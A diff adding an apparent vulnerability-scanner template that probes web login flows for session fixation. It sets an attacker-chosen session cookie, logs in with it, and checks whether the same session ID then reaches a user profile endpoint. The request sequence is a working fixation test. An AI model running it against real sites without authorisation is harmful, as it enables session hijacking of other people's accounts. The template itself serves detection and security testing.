@@ -1,0 +1,63 @@
+id: custom-2026-auth-004
+info:
+  name: Session Fixation - Cookie Parameter Manipulation
+  author: SecurityTeam
+  severity: high
+  description: |
+    Exploits session fixation vulnerability:
+    1. Attacker sets session cookie via custom parameters
+    2. User logs in with attacker-controlled session
+    3. Session not regenerated after login
+    4. Attacker gains access using fixed session ID
+    
+    Behavioral detection:
+    - Session ID persistence across authentication
+    - Cookie manipulation in custom parameters
+    - Missing session regeneration after login
+  
+  reference:
+    - https://owasp.org/www-community/attacks/Session_fixation
+
+requests:
+  - method: GET
+    path: /login
+    headers:
+      Cookie: "session_id={{attacker_session_id}}"
+    
+    extractors:
+      - type: regex
+        internal: true
+        name: login_form_token
+        regex: 'csrf[_-]token["\']?\s*[:=]\s*["\']?([a-f0-9]{32})'
+
+  - method: POST
+    path: /login
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: "session_id={{attacker_session_id}}"
+    body: "username={{username}}&password={{password}}&csrf={{login_form_token}}"
+    
+    extractors:
+      - type: regex
+        internal: true
+        name: session_after_login
+        regex: 'session_id=([a-f0-9]{32})'
+
+  - method: GET
+    path: /api/user/profile
+    headers:
+      Cookie: "session_id={{attacker_session_id}}"
+    
+    matchers:
+      - type: dsl
+        expressions:
+          # Session ID not regenerated after login
+          - 'attacker_session_id == session_after_login'
+          - 'contains(body, "user_id")'
+        condition: all
+
+tags:
+  - authentication
+  - session-fixation
+  - cookie-manipulation
+  - privilege-escalation
